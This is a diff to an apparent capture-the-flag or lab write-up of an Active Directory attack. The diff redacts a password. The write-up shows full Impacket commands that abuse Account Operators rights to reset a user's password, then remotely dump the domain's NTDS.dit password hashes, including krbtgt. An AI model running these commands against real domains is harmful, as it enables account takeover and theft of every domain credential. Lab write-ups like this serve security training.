@@ -141,14 +141,14 @@ The goal was to leverage the Account Operators privileges of `xkate578` to force
 Initial attempts to change the password via `rpcclient` and `bloodyad` proved difficult. Impacket's `changepasswd.py` was used to cleanly execute the password reset over RPC.
 
 ```
-impacket-changepasswd 'SOUPEDECODE.LOCAL/fbeth103@192.168.56.106' -altuser 'xkate578' -altpass '<xkate578_Password>' -newpass 'Password123!' -no-pass -reset
+impacket-changepasswd 'SOUPEDECODE.LOCAL/fbeth103@192.168.56.106' -altuser 'xkate578' -altpass '<xkate578_Password>' -newpass '<REDACTED>' -no-pass -reset
 ```
 
 ![](password-change.png)
 
 ### Verifying Access
 
-The newly set credentials (`fbeth103`:`Password123!`) were tested and confirmed to be valid, granting access to a highly privileged account within the environment.
+The newly set credentials (`fbeth103`:`<REDACTED>`) were tested and confirmed to be valid, granting access to a highly privileged account within the environment.
 
 ![](testing-creds.png)
 
@@ -161,7 +161,7 @@ With a fully compromised administrative account, the final step was to compromis
 Impacket's `secretsdump.py` was executed to remotely dump the NTDS.dit file and extract all domain password hashes (including the krbtgt account and Domain Admins).
 
 ```
-impacket-secretsdump 'SOUPEDECODE.LOCAL'/'fbeth103':'Password123!'@192.168.56.106
+impacket-secretsdump 'SOUPEDECODE.LOCAL'/'fbeth103':'<REDACTED>'@192.168.56.106
 ```
 
 ### Remote Administration
